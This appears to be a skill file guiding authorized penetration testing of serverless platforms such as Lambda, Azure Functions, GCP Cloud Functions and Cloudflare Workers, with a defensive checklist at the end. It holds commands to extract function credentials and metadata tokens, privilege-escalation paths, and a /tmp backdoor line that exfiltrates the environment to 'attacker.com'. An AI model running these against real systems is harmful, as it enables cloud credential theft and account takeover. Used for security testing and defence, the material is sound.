---
name: attacking-serverless
description: Attack serverless compute — AWS Lambda, Azure Functions, GCP Cloud Functions, and edge runtimes like Cloudflare Workers. Enumerate functions, inject through event sources (S3, SQS, SNS, API Gateway, EventBridge), extract credentials from the execution environment, abuse over-privileged IAM roles, exploit cold-start persistence and container reuse, and test trigger misconfigurations. Use when a target runs serverless functions, when API Gateway or function URLs front compute, when event-driven architectures process untrusted input, or when cloud function execution roles need privilege-escalation testing.
verified: 2026-07-27
---

# Attacking Serverless

Serverless changes the attack surface from hosts to events. There is no SSH, no
persistent shell, no OS to enumerate in the traditional sense. The execution
environment is ephemeral, but the IAM role attached to it is not, and that role
is almost always the real target. A compromised Lambda function does not give you
a server — it gives you a set of AWS credentials that refresh automatically,
have no MFA, and were scoped by a developer who optimized for "make it work"
rather than least privilege. The same pattern holds across Azure Functions, GCP
Cloud Functions, and edge runtimes, with minor variation in where the credentials
live and how the isolation boundary is drawn.

## When to Use

- The target runs AWS Lambda, Azure Functions, GCP Cloud Functions, or
  Cloudflare Workers
- API Gateway, Azure API Management, or GCP API Gateway fronts serverless compute
- Event-driven architectures process input from S3, SQS, SNS, EventBridge,
  Pub/Sub, or Storage triggers
- You need to test the execution role or managed identity attached to a function
- Step Functions, Durable Functions, or Cloud Workflows orchestrate serverless
  components
- Function URLs or HTTP triggers are exposed without an authorizer

## When NOT to Use

- **IAM-only without serverless compute** — use `exploiting-cloud-platforms` for
  general cloud IAM enumeration and privilege escalation
- **API Gateway as a REST API** where the backend is containers or VMs — use
  `testing-apis` for the API methodology
- **Source code review of function code** without runtime access — use
  `auditing-code-for-vulnerabilities` for static analysis

## Reconnaissance

Discover functions before you attack them. The function name, runtime, handler,
event sources, and attached role are all enumerable from the cloud control plane
or from the application itself.

```bash
# AWS — list functions and their configurations
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role,Handler]' --output table
aws lambda list-event-source-mappings --function-name TARGET_FUNCTION
aws apigateway get-rest-apis
aws apigatewayv2 get-apis

# Azure
az functionapp list --query '[].{name:name, runtime:siteConfig.linuxFxVersion, rg:resourceGroup}' -o table
az functionapp function list --name APP_NAME --resource-group RG

# GCP
gcloud functions list --format='table(name,runtime,entryPoint,trigger)'
gcloud functions describe FUNCTION_NAME
```

From the outside, look for: API Gateway default stages (`/prod`, `/dev`,
`/stage`), function URL patterns (`*.lambda-url.*.on.aws`,
`*.azurewebsites.net/api/`, `*.cloudfunctions.net`), and error responses
that leak runtime information (`Runtime.HandlerNotFound`,
`MODULE_NOT_FOUND`).

## Event Injection

In serverless, the event IS the input. Every event source is an entry point,
and most of them are not HTTP — they bypass WAFs, API gateways, and any
middleware that only inspects HTTP requests.

**The event object is attacker-controlled when:**

- S3 bucket names and object keys arrive in the event (path traversal in key names)
- SQS/SNS message bodies are processed without validation
- API Gateway passes query strings, headers, and body into the event
- EventBridge custom events are accepted from accounts you control
- DynamoDB Streams carry records you inserted through the application
- Cloudflare Workers receive the full Request object including headers and URL

```python
# S3 event — the key is attacker-controlled if uploads are open
{
  "Records": [{
    "s3": {
      "bucket": {"name": "target-bucket"},
      "object": {"key": "../../../tmp/payload"}
    }
  }]
}
```

```bash
# Inject through SQS — if you have SendMessage permission
aws sqs send-message --queue-url https://sqs.*.amazonaws.com/ACCOUNT/QUEUE \
  --message-body '{"exploit": "payload"}'

# Invoke a function directly if you have lambda:InvokeFunction
aws lambda invoke --function-name TARGET --payload '{"key":"value"}' /dev/stdout
```

Test each event source independently. A function that sanitizes HTTP input from
API Gateway may not sanitize the same fields when they arrive from SQS.

## Environment Variable Extraction

Serverless runtimes inject credentials and configuration as environment
variables. If you achieve code execution inside a function, these are the
first targets.

```bash
# Read the process environment — works in most runtimes
cat /proc/self/environ | tr '\0' '\n'

# Key variables on AWS Lambda
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN
echo $AWS_LAMBDA_FUNCTION_NAME
echo $AWS_REGION

# Lambda runtime API — metadata endpoint inside the execution environment
curl -s "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"

# Azure Functions
echo $AzureWebJobsStorage          # often a full connection string
echo $IDENTITY_ENDPOINT            # managed identity token endpoint
curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"

# GCP Cloud Functions — metadata server
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

Developers also store secrets in environment variables directly rather than
using Secrets Manager or Key Vault. Look for database connection strings, API
keys, and third-party credentials.

## IAM Role Abuse

The function's execution role is the pivot point. It is almost always
over-privileged because developers add permissions until the function works
and never remove them.

```bash
# Identify who you are
aws sts get-caller-identity

# Enumerate what you can do — use the stolen credentials outside Lambda
# (session tokens from Lambda are valid for up to 12 hours)
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enumerate policies attached to the role
aws iam list-attached-role-policies --role-name ROLE_NAME
aws iam get-role-policy --role-name ROLE_NAME --policy-name POLICY

# Common over-privileges to check for
aws s3 ls                                     # s3:ListAllMyBuckets
aws secretsmanager list-secrets               # secretsmanager:ListSecrets
aws dynamodb list-tables                      # dynamodb:ListTables
aws lambda list-functions                     # lambda:ListFunctions
aws iam list-roles                            # iam:ListRoles
```

**Escalation paths from a Lambda role:**

- `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` — create
  a new function with a more privileged role and invoke it
- `lambda:UpdateFunctionCode` — replace another function's code with your payload
- `iam:AttachRolePolicy` — attach AdministratorAccess to the current role
- `sts:AssumeRole` — pivot to cross-account roles that trust the Lambda role
- `ssm:GetParameter` — read secrets from Parameter Store
- `secretsmanager:GetSecretValue` — read secrets from Secrets Manager

On Azure, a managed identity with Contributor on the subscription is the
equivalent finding. On GCP, check for `iam.serviceAccountTokenCreator` or
`owner` roles on the function's service account.

## Cold Start and Runtime Persistence

The execution environment persists between invocations for minutes to hours.
Anything written to `/tmp` survives across calls to the same warm container.

```bash
# Check for artifacts from previous invocations
ls -la /tmp/
cat /tmp/*.log 2>/dev/null

# Write a persistent payload — it will execute on the next invocation
echo 'import os; os.system("curl attacker.com/exfil?data=$(env|base64)")' > /tmp/backdoor.py
```

**Lambda Layers** are extracted to `/opt` and shared across functions. A
compromised layer poisons every function that uses it. Check:

```bash
aws lambda list-layers
aws lambda get-layer-version --layer-name NAME --version-number 1
# Download, inspect, and look for writable paths or injected dependencies
```

**Container reuse** means: file-system state persists in `/tmp`, global
variables in the runtime persist, database connection pools persist, and any
background threads you start keep running. On Cloudflare Workers (V8 isolates),
global scope persists within the isolate but `/tmp` does not exist.

## Shared Tenancy and Isolation Boundaries

Understand the isolation model before assuming escape is possible or impossible.

- **AWS Lambda** runs each function in a Firecracker microVM. Cross-function
  escape requires a Firecracker vulnerability, which is a different class of
  work. Within a single function, container reuse is the relevant boundary.
- **Cloudflare Workers** use V8 isolates, not containers. Multiple tenants
  share a process. Isolate escapes are V8 vulnerabilities — high impact but
  rare. Side-channel attacks (Spectre-class) are more realistic; Cloudflare
  disables `SharedArrayBuffer` and high-resolution timers to mitigate.
- **Azure Functions** on the Consumption plan share underlying VMs across
  tenants. The isolation is process-level, not VM-level, on shared plans.
- **GCP Cloud Functions** uses gVisor for sandboxing, which limits syscall
  surface.

For most engagements, focus on the IAM role and the application logic rather
than the runtime isolation. Sandbox escape is a research target, not a pentest
finding.

## Trigger Misconfiguration

The most common serverless vulnerability is not in the code — it is in how the
function is exposed.

```bash
# Public API Gateway with no authorizer
aws apigateway get-resources --rest-api-id API_ID
aws apigateway get-method --rest-api-id API_ID --resource-id RES_ID --http-method GET
# Check: authorizationType should not be "NONE" on sensitive endpoints

# Lambda function URLs — public by default if auth-type is NONE
aws lambda list-function-url-configs --function-name FUNC
aws lambda get-function-url-config --function-name FUNC
# Check: AuthType should be AWS_IAM, not NONE

# Azure — function-level authorization keys
az functionapp function keys list --name APP --function-name FUNC --resource-group RG
# Check: authLevel should not be "anonymous" on sensitive functions
```

**Common misconfigurations:**

- API Gateway deployed without an authorizer (Lambda authorizer, Cognito, IAM)
- Function URL with `AuthType: NONE` — reachable by anyone with the URL
- Missing CORS restrictions on API Gateway allowing cross-origin mutation
- API Gateway stage variables leaking internal endpoints or credentials
- S3 event notifications triggering functions on attacker-uploaded objects
  without validating the upload source
- SNS topics with open subscription policies allowing external subscribers

## Step Functions and Workflow Manipulation

Orchestration services (AWS Step Functions, Azure Durable Functions, GCP
Workflows) introduce state machine logic that is often testable.

```bash
# List and describe state machines
aws stepfunctions list-state-machines
aws stepfunctions describe-state-machine --state-machine-arn ARN

# List executions and inspect input/output
aws stepfunctions list-executions --state-machine-arn ARN --status-filter RUNNING
aws stepfunctions describe-execution --execution-arn EXEC_ARN
aws stepfunctions get-execution-history --execution-arn EXEC_ARN
```

**Attack patterns:**

- **Input manipulation** — start an execution with crafted input that skips
  validation steps or takes an unintended branch
- **Step injection** — if the state machine definition is stored in a location
  you can write to (S3, DynamoDB), modify it
- **Activity task hijacking** — if a step uses an Activity (poll-based), any
  principal with `GetActivityTask` can steal work items
- **Callback token theft** — task tokens sent to SQS or SNS for callback
  patterns can be intercepted to complete steps with arbitrary output
- **Parallel state abuse** — race conditions in parallel branches that share
  mutable state (DynamoDB, S3)

## Defensive Review Checklist

When reviewing a serverless deployment, verify each item:

- [ ] Every function uses a dedicated IAM role scoped to its actual needs
- [ ] No function role has `*` resource or `*` action in its policy
- [ ] API Gateway endpoints have an authorizer configured (not `NONE`)
- [ ] Function URLs use `AWS_IAM` auth type or are not enabled
- [ ] Environment variables do not contain secrets — secrets are in Secrets
      Manager, Key Vault, or Secret Manager with runtime retrieval
- [ ] Event source inputs are validated inside the function, not just at the
      API Gateway layer
- [ ] Lambda Layers are pinned to specific versions and sourced from trusted
      publishers
- [ ] Step Function inputs are validated at each step, not only at entry
- [ ] Function timeout and memory limits are set to prevent runaway execution
- [ ] CloudWatch/Cloud Logging is enabled and alerts exist for function errors
      and unusual invocation patterns
- [ ] VPC-attached functions use security groups and NACLs to restrict egress
- [ ] CORS on API Gateway is restricted to specific origins, not `*`

## Rationalizations to Reject

- *"The function is ephemeral, so persistence is impossible."* `/tmp` and
  global state survive across warm invocations. Layers persist across
  deployments. The IAM credentials work from anywhere.
- *"We use API Gateway, so the function is not directly reachable."* Test
  for function URLs, direct `lambda:InvokeFunction` permissions, and event
  sources that bypass the gateway entirely.
- *"The function only processes internal events, not user input."* Trace the
  event chain backward. If a user can upload to S3 or post to an SNS topic,
  the "internal" event carries attacker-controlled data.
- *"IAM permissions are managed by infrastructure-as-code, so they are
  reviewed."* Read the Terraform or SAM template. Wildcard resources and
  managed policy attachments like `AmazonS3FullAccess` pass code review
  constantly.
- *"Cloudflare Workers are isolated by V8, so there is no escape."* The
  isolate boundary is strong, but the Worker's bound service bindings (KV,
  R2, D1, secrets) are the real targets, not the isolate itself.
- *"We rotate the credentials automatically."* Lambda session tokens are
  valid for hours and refresh transparently. Rotation does not help if the
  attacker is inside the function.
- *"The function has no network access — it is not in a VPC."* A function
  outside a VPC has unrestricted internet egress by default. It can reach
  any AWS API endpoint with its role credentials.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Execution** (TA0002)

- [T1648](https://attack.mitre.org/techniques/T1648/) Serverless Execution

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `exploiting-cloud-platforms` — general cloud IAM, control plane, and
  privilege escalation methodology
- `testing-apis` — API Gateway and HTTP endpoint testing methodology
- `auditing-code-for-vulnerabilities` — static review of function handler code
- `engineering-detections` — detection engineering for serverless abuse patterns
